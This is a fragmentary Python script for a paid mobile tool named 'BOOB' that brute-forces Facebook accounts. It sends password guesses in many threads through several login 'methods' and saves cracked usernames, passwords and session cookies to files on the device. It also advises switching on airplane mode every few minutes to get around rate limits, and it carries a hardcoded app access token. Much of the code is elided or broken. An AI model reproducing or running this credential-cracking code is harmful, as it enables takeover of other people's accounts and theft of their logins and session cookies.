...
try:
	...
	os.system('python BOOB.py')
	
print('\033[1;32m[•] Join Our Group')
...
########   #######   #######  ########                                                                     \033[1;91mBOOB
\033[1;37m==============================================================
[•] Author   : BOOBAMED × AMINOS
[•] Facebook : BOOB
[•] Tool     : PAID
[•] Version  : 1.0
\033[1;37m==============================================================
   \33[37;41m\t WELLCOM TO BOOB TOOL \33[0;m
==============================================================
    \33[37;41m\t THIS TOOL IS PAID \33[0;m
==============================================================""")
def linex():
	print('\033[1;37m==============================================================')
def boob_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    r1=requests.get("https://github.com/BOODXD/BOOB/blob/main/Appove.txt").text
    if id in r1:
        Main()
    else:
        os.system("clear")
        ...
        os.system("clear")
        print(logo)
        print("  \33[37;41m\t YOU NEED APORVAL \33[0;m")
        print ("==============================================================")
        print(" \33[37;41m\t THIS TOOL IS PAID SO YOU NEED APORVAL \33[0;m ")
        print ("==============================================================")
        print(" \33[37;41m\t YOUR KEY IS NOT APORVAL \33[0;m ")
        print('==============================================================') 
        print(" \33[37;41m\t COPPY AND SEND TO ADMIN\33[0;m")
        print ("\033[1;37m==============================================================")
        print ("   \33[37;41m\t YOUR KEY \33[0;m "+UMO+id)
        print ("==============================================================")
        name = input("    \33[37;41m\t YOUR NAME  : \33[0;m ")
        print ("==============================================================")
        input("   \33[37;41m\t ENTER TO SEND KEY \33[0;m")
        os.system("am start https://t.me/r0erq")
        boob_menu()   
boob_menu()
def clear():
	os.system('clear')
		...
		#	os.system('xdg-open https://www.facebook.com/dr.paigham')
			if xd in ['1','01']:
				...
				try:
					...
					menu()
				clear()
				print('   \33[37;41m\t USE METHOD 1 \33[0;m ')
				linex()
				print('[1] \033[1;37mMethod    \n[2] \033[1;37mMethod \n[3]\033[1;37m Method')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				try:
					...
					ps_limit =1
				clear()
				print('\033[1;37m Exp: First Last,Firtslast,First123')
				linex()
				...
				with tred(max_workers=30) as crack_submit:
					...
					print('   \33[37;41m\t TOTAL ID \33[0;m : \033[1;37m'+total_ids+f' ')
					print('==============================================================') 
					print('   \33[37;41m\t USE AIRPLANE MODE EVERY 3 MINIUTE \33[0;m')
					linex()
					for user in fo:
...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as BOOB:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					BOOB.submit(BOOB1,ids,passlist)
				if mthd in ['2','02']:
					BOOB.submit(BOOB2,ids,passlist)
				if mthd in ['3','03']:
					BOOB.submit(BOOB3,ids,passlist)
				if mthd in ['4','04']:
					BOOB.submit(BOOB4,ids,passlist)
				if mthd in ['5','05']:
					BOOB.submit(BOOB5,ids,passlist)
				if mthd in ['6','06']:
					BOOB.submit(BOOB6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [BOOB-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [BOOB-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/BOOB-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [BOOB-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/BOOB-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/BOOB-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [BOOB-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/BOOB-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BOOB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[BOOB-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BOOB-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/BOOB-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/BOOB-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BOOB-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [BOOB-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/BOOB-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [BOOB-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [BOOB-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			BOOB=session.cookies.get_dict().keys()
			if "c_user" in BOOB:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [BOOB-OK] %s | %s'%(ids,pas))
				open('/sdcard/BOOB-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in BOOB:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [BOOB-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/BOOB-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [BOOB-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [BOOB-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [BOOB-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BOOB-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [BOOB-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/BOOB-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def BOOB2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [BOOB-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/BOOB-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [BOOB-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/BOOB-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def BOOB3(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/BOOB-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/BOOB-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#method4
def BOOB4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [BOOB-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [BOOB-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [BOOB-OK] '+uid+' | '+pas)
						open('/sdcard/BOOB-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [BOOB-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/BOOB-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
